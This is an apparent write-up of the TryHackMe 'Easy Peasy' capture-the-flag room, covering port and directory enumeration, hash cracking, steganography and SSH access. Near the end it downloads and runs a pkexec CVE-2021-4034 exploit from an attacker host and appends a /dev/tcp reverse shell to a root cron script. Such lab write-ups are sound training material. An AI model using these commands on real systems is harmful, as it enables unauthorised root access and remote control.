## Easy Peasy
https://tryhackme.com/room/easypeasyctf

## Enum
```
nmap -Pn -sC -sV 10.10.85.130 -vv

Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-methods:
|_  Supported Methods: GET HEAD
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Welcome to nginx!


nmap -Pn 10.10.85.130 -p- --min-rate=1000

Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown

nmap -Pn -sC 10.10.85.130 -p 80,6498,65524 -A

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
```

```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

hidden                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 418ms]
index.html              [Status: 200, Size: 612, Words: 79, Lines: 26, Duration: 423ms]
robots.txt              [Status: 200, Size: 43, Words: 3, Lines: 4, Duration: 414ms]
:: Progress: [4713/4713] :: Job [1/1] :: 94 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

```
ffuf -u http://ip.thm:65524/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 419ms]
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 440ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 452ms]
index.html              [Status: 200, Size: 10818, Words: 3441, Lines: 371, Duration: 451ms]
robots.txt              [Status: 200, Size: 153, Words: 13, Lines: 7, Duration: 444ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 428ms]
:: Progress: [4713/4713] :: Job [1/1] :: 94 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/191743667-a9d97030-e9ba-4aa7-8deb-a8db0ea72372.png)

![image](https://user-images.githubusercontent.com/6504854/191750946-be95a8e7-235c-47bb-a994-1ace416aa24b.png)

🏴 https://md5hashing.net/

```
ffuf -u http://ip.thm/hidden/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

index.html              [Status: 200, Size: 390, Words: 47, Lines: 19, Duration: 425ms]
whatever                [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 465ms]
:: Progress: [4713/4713] :: Job [1/1] :: 96 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/191743885-d0cc97af-bf9f-48e1-85c0-6af07df98f0f.png)

```
echo 'Z**********************==' | base64 -d
flag{*****_****}
```

![image](https://user-images.githubusercontent.com/6504854/191744628-48bcf926-03ba-45bb-9fc6-20553cfd8b8e.png)

![image](https://user-images.githubusercontent.com/6504854/191744804-e92b7394-2f69-4021-ad69-9e6ff6cec551.png)

![image](https://user-images.githubusercontent.com/6504854/191745200-cd9478f9-3eb1-4927-85f0-78c600f11ada.png)

![image](https://user-images.githubusercontent.com/6504854/191745814-d466f19e-84c7-42ce-9148-b682dd76bdcb.png)

![image](https://user-images.githubusercontent.com/6504854/191746012-16e0c479-ab26-4a2c-9e00-ba168a06ea96.png)

```
echo '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81' > hash

john --wordlist=easypeasy.txt --format=gost hash
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
my***************** (?)
Session completed.
```

```
curl http://ip.thm:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg -o bi.jpg -v

file bi.jpg
bi.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 960x678, components 3

steghide extract -sf bi.jpg
Enter passphrase:
wrote extracted data to "secrettext.txt".

cat secrettext.txt
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

![image](https://user-images.githubusercontent.com/6504854/191747592-8d698573-1eff-4d7f-9b19-203e2f0d5641.png)

## Flag
```
ssh -l boring ip.thm -p 6498
boring@ip.thm's password:

You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!

boring@kral4-PC:~$ cd /home/boring

boring@kral4-PC:~$ ls -la
total 40
drwxr-xr-x 5 boring boring 4096 Jun 15  2020 .
drwxr-xr-x 3 root   root   4096 Jun 14  2020 ..
-rw------- 1 boring boring    2 Sep 22 03:01 .bash_history
-rw-r--r-- 1 boring boring  220 Jun 14  2020 .bash_logout
-rw-r--r-- 1 boring boring 3130 Jun 15  2020 .bashrc
drwx------ 2 boring boring 4096 Jun 14  2020 .cache
drwx------ 3 boring boring 4096 Jun 14  2020 .gnupg
drwxrwxr-x 3 boring boring 4096 Jun 14  2020 .local
-rw-r--r-- 1 boring boring  807 Jun 14  2020 .profile
-rw-r--r-- 1 boring boring   83 Jun 14  2020 user.txt

boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
s***{a0************}
```

![image](https://user-images.githubusercontent.com/6504854/191748147-9b959dc8-c06b-4b80-be62-097a6a365594.png)

```
boring@kral4-PC:~$ sudo -l
[sudo] password for boring:
Sorry, user boring may not run sudo on kral4-PC.

boring@kral4-PC:~$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec

boring@kral4-PC:~$ wget 10.10.10.10/1.tar
Saving to: ‘1.tar’

boring@kral4-PC:~$ tar -xvf 1.tar
./cve-2021-4034
./README.md

boring@kral4-PC:~$ ./cve-2021-4034
# cat /root/.root.txt
flag{63*****************************}
# exit
```

### Another Path

```
boring@kral4-PC:~$ find / -user boring -type f 2>/dev/null
/proc/1390/task/1390/fdinfo/0
/proc/1496/patch_state
/var/www/.mysecretcronjob.sh
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs

boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh

boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
boring@kral4-PC:~$ echo 'sh -i >& /dev/tcp/10.10.10.10/1111 0>&1' >> /var/www/.mysecretcronjob.sh
boring@kral4-PC:~$ /var/www/.mysecretcronjob.sh
/var/www/.mysecretcronjob.sh: connect: Connection refused
/var/www/.mysecretcronjob.sh: line 3: /dev/tcp/10.4.63.222/1111: Connection refused
```
![image](https://user-images.githubusercontent.com/6504854/191752500-dfd25820-3ee6-4ef7-bfc0-81c3e38e0980.png)

It showed connection refused but I succeeded to get shell.

Thank you for your time, Happy Hacking. 😄


